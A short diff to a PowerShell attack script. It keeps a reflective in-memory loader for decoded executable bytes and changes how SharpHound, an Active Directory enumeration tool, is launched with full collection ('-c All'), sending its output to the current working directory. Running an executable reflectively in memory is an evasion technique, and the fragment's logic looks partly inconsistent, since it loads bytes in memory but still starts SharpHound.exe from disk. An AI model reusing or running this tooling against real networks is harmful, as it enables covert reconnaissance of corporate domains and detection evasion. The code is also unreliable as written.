@@ -53,11 +53,13 @@ public class PELoader
     [System.Runtime.InteropServices.Marshal]::FreeHGlobal($mem)
 }
 
+# Get the current working directory
+$outputDirectory = (Get-Location).Path
+
 # Invoke the reflective PE loader function with the decoded executable bytes
 Invoke-ReflectivePE -PEBytes $exeBytes
 
-# Example usage of SharpHound with arguments
-$sharpHoundPath = "SharpHound.exe"
-$arguments = "-c All"
+# Example usage of SharpHound with arguments and the current working directory as the output directory
+$arguments = "-c All -o $outputDirectory"
 
-Start-Process -FilePath $sharpHoundPath -ArgumentList $arguments
+Start-Process -FilePath "SharpHound.exe" -ArgumentList $arguments
